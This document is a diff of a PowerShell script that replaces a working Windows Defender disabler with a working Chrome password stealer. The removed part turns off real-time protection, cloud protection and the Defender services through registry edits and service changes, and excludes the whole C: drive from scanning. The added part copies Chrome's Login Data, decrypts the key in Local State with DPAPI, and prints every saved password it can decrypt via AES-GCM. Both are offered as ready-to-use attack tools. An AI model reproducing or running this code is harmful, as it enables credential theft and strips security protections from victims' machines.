@@ -1,56 +1,181 @@
-# Advanced Windows Defender Disabler
-# Must run as Administrator
+# BARE MINIMUM Chrome Password Stealer - Visible, No Auto-Close
 
-Write-Host "Attempting to disable Windows Defender..." -ForegroundColor Yellow
+Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
+Write-Host ""
 
-# Method 1: Set-MpPreference
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Write-Host "[1] Set-MpPreference: Attempted" -ForegroundColor Green
-} catch {
-    Write-Host "[1] Set-MpPreference: Failed - $($_.Exception.Message)" -ForegroundColor Red
+# Find Chrome database - check all possible profile locations
+Write-Host "Searching for Chrome profiles..." -ForegroundColor Yellow
+
+$chromeUserData = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+
+if (-not (Test-Path $chromeUserData)) {
+    Write-Host "ERROR: Chrome User Data folder not found!" -ForegroundColor Red
+    Write-Host "Path checked: $chromeUserData"
+    Read-Host "Press Enter to exit"
+    exit
 }
 
-# Method 2: Registry - Disable Real-Time Protection
-try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -ErrorAction SilentlyContinue
-    Write-Host "[2] Registry modifications: Done" -ForegroundColor Green
-} catch {
-    Write-Host "[2] Registry modifications: Failed - $($_.Exception.Message)" -ForegroundColor Red
+# List all profiles
+$profiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+
+Write-Host "Found $($profiles.Count) profile(s):" -ForegroundColor Green
+foreach ($profile in $profiles) {
+    Write-Host "  - $($profile.Name)"
 }
 
-# Method 3: Disable Defender Services
-$services = @("WinDefend", "WdNisSvc", "Sense")
-foreach ($svc in $services) {
-    try {
-        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Host "[3] Service $svc : Stopped & Disabled" -ForegroundColor Green
-    } catch {
-        Write-Host "[3] Service $svc : Failed" -ForegroundColor Red
+# Find Login Data in any profile
+$dbPath = $null
+
+foreach ($profile in $profiles) {
+    $testPath = Join-Path $profile.FullName "Login Data"
+    if (Test-Path $testPath) {
+        $dbPath = $testPath
+        Write-Host "`nUsing profile: $($profile.Name)" -ForegroundColor Green
+        break
     }
 }
 
-# Method 4: Add exclusion for entire C: drive
-try {
-    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
-    Write-Host "[4] Added C:\ to exclusions" -ForegroundColor Green
-} catch {
-    Write-Host "[4] Exclusions: Failed" -ForegroundColor Red
+if (-not $dbPath) {
+    Write-Host "`nERROR: No 'Login Data' file found in any profile!" -ForegroundColor Red
+    Write-Host "`nChecked these locations:"
+    foreach ($profile in $profiles) {
+        Write-Host "  - $($profile.FullName)\Login Data"
+    }
+    Read-Host "Press Enter to exit"
+    exit
 }
 
-# Method 5: Disable Cloud Protection
+Write-Host "Database found: $dbPath" -ForegroundColor Green
+
+# Try to copy it
+$tempDb = "$env:TEMP\chrome_copy.db"
+
+Write-Host ""
+Write-Host "Copying database..." -ForegroundColor Yellow
+
 try {
-    Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
-    Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
-    Write-Host "[5] Cloud protection disabled" -ForegroundColor Green
+    Copy-Item $dbPath $tempDb -Force
+    Write-Host "Copy successful!" -ForegroundColor Green
 } catch {
-    Write-Host "[5] Cloud protection: Failed" -ForegroundColor Red
+    Write-Host "ERROR: Cannot copy - Chrome might be running!" -ForegroundColor Red
+    Write-Host "Error: $($_.Exception.Message)"
+    Read-Host "Press Enter to exit"
+    exit
 }
 
-Write-Host "`nDefender disable attempts complete. Reboot may be required." -ForegroundColor Cyan
-Write-Host "Note: If Tamper Protection is ON, most methods will fail." -ForegroundColor Yellow
+# Install PSSQLite if needed
+Write-Host ""
+Write-Host "Checking PSSQLite module..." -ForegroundColor Yellow
+
+if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
+    Write-Host "Installing PSSQLite..." -ForegroundColor Yellow
+    Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
+}
+
+Import-Module PSSQLite
+Write-Host "PSSQLite loaded!" -ForegroundColor Green
+
+# Query database
+Write-Host ""
+Write-Host "Querying database..." -ForegroundColor Yellow
+
+$query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 10"
+
+try {
+    $results = Invoke-SqliteQuery -DataSource $tempDb -Query $query
+    Write-Host "Found $($results.Count) entries!" -ForegroundColor Green
+} catch {
+    Write-Host "ERROR: Query failed!" -ForegroundColor Red
+    Write-Host "Error: $($_.Exception.Message)"
+    Remove-Item $tempDb -Force
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+# Get encryption key
+Write-Host ""
+Write-Host "Getting encryption key..." -ForegroundColor Yellow
+
+$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+
+if (-not (Test-Path $localStatePath)) {
+    Write-Host "ERROR: Local State not found!" -ForegroundColor Red
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+Add-Type -AssemblyName System.Security
+
+$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+$encryptedKeyB64 = $localState.os_crypt.encrypted_key
+$encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
+$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+
+$key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
+
+Write-Host "Encryption key obtained! Length: $($key.Length) bytes" -ForegroundColor Green
+
+# Try to decrypt passwords
+Write-Host ""
+Write-Host "Decrypting passwords..." -ForegroundColor Yellow
+Write-Host ""
+
+$decrypted = 0
+
+foreach ($row in $results) {
+    $url = $row.origin_url
+    $username = $row.username_value
+    $encPass = [byte[]]$row.password_value
+    
+    if (-not $encPass -or $encPass.Length -eq 0) {
+        continue
+    }
+    
+    Write-Host "URL: $url" -ForegroundColor Cyan
+    Write-Host "  Username: $username"
+    Write-Host "  Encrypted length: $($encPass.Length) bytes"
+    Write-Host "  First 3 bytes: $($encPass[0]), $($encPass[1]), $($encPass[2])"
+    
+    try {
+        # Check if v10/v11 (starts with 'v')
+        if ($encPass[0] -eq 118) {
+            Write-Host "  Encryption: AES-GCM (v10+)" -ForegroundColor Yellow
+            
+            $nonce = $encPass[3..14]
+            $ciphertext = $encPass[15..($encPass.Length - 17)]
+            $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
+            
+            $aes = [Security.Cryptography.AesGcm]::new($key)
+            $plaintext = New-Object byte[] $ciphertext.Length
+            
+            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
+            
+            $password = [Text.Encoding]::UTF8.GetString($plaintext)
+            
+            Write-Host "  Password: $password" -ForegroundColor Green
+            $decrypted++
+        } else {
+            Write-Host "  Encryption: DPAPI (old)" -ForegroundColor Yellow
+            
+            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+            $password = [Text.Encoding]::UTF8.GetString($decryptedBytes)
+            
+            Write-Host "  Password: $password" -ForegroundColor Green
+            $decrypted++
+        }
+    } catch {
+        Write-Host "  FAILED: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    Write-Host ""
+}
+
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "Successfully decrypted: $decrypted passwords" -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Cyan
+
+# Cleanup
+Remove-Item $tempDb -Force
+
+Write-Host ""
+Read-Host "Press Enter to exit"
